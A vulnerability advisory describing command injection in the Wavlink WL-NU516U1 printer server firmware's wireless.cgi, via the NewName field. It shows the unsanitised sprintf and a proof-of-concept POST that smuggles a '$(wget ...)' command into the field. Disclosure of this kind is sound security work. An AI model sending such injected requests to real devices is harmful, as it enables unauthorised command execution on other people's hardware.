# WL-NU516U1 wireless.cgi SetName NewName Command Injection

Vendor: Wavlink

Product: WL-NU516U1

Version: M16U1_V240425
Firmware Download: https://docs.wavlink.xyz/Firmware/?category=USB+Printer+Server&model=WL-NU516U1-A

Vulnerability: Command Injection

CVE: TBD

## Affected version

Wavlink WL-NU516U1 M16U1_V240425

## Vulnerability details

Wavlink WL-NU516U1 M16U1_V240425 contains a command injection vulnerability in /cgi-bin/wireless.cgi.

When the `page` parameter is set to `SetName`, the function `sub_403198` is invoked.

The function reads `NewName` from POST data and concatenates it into a shell command:

```c
sprintf(v14, "/etc/lighttpd/www/cgi-bin/change_name.sh %s %s &", v4, v7);
sub_405314(v14);
```

Where `v4` = `mac_5g` and `v7` = `NewName`. No sanitization is applied to either parameter.

## Proof of Concept (PoC)

```http
POST /cgi-bin/wireless.cgi HTTP/1.1
Host: 192.168.6.3
Content-Type: application/x-www-form-urlencoded
Referer: http://192.168.6.3/
Connection: close
Content-Length: 62

page=SetName&mac_5g=AA:BB:CC:DD:EE:FF&NewName=$(wget http://192.168.6.1:6666/newname)
```
